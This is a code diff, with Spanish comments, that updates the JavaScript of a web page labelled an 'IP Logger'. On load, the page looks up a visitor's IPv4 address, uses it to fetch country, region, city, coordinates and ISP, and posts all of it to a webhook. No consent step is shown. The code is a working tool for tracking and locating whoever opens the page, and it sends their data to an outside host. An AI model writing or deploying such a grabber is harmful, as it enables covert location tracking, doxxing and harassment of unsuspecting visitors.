@@ -12,20 +12,27 @@
 
     async function logVisitorInfo() {
       try {
-        const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
+        // 1. Obtener IPv4
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipDataRaw = await ipRes.json();
+        const ipv4 = ipDataRaw.ip;
+
+        // 2. Obtener info con esa IP desde ipapi.co
+        const geoRes = await fetch(`https://ipapi.co/${ipv4}/json/`);
+        const geoData = await geoRes.json();
 
         const payload = {
-          username: "IP Logger (HTML)",
+          username: "IP Logger (IPv4)",
           embeds: [{
-            title: "🔍 Nueva visita (HTML)",
+            title: "🔍 Nueva visita (IPv4)",
             color: 16753920,
             fields: [
-              { name: "🔗 IP", value: ipData.ip || "No disponible", inline: false },
-              { name: "🌎 País", value: ipData.country_name || "No disponible", inline: true },
-              { name: "🗺️ Región", value: ipData.region || "No disponible", inline: true },
-              { name: "🌆 Ciudad", value: ipData.city || "No disponible", inline: true },
-              { name: "📍 Coordenadas", value: `${ipData.latitude}, ${ipData.longitude}` || "No disponible", inline: true },
-              { name: "🧭 ISP", value: ipData.org || "No disponible", inline: false }
+              { name: "🔗 IP", value: ipv4 || "No disponible", inline: false },
+              { name: "🌎 País", value: geoData.country_name || "No disponible", inline: true },
+              { name: "🗺️ Región", value: geoData.region || "No disponible", inline: true },
+              { name: "🌆 Ciudad", value: geoData.city || "No disponible", inline: true },
+              { name: "📍 Coordenadas", value: `${geoData.latitude}, ${geoData.longitude}` || "No disponible", inline: true },
+              { name: "🧭 ISP", value: geoData.org || "No disponible", inline: false }
             ],
             footer: { text: `Fecha: ${new Date().toLocaleString()}` }
           }]
@@ -37,7 +44,7 @@
           body: JSON.stringify(payload)
         });
 
-        document.body.innerHTML = "<h2>¡Información enviada al webhook!</h2>";
+        document.body.innerHTML = "<h2>¡Información IPv4 enviada al webhook!</h2>";
 
       } catch (error) {
         console.error("Error:", error);
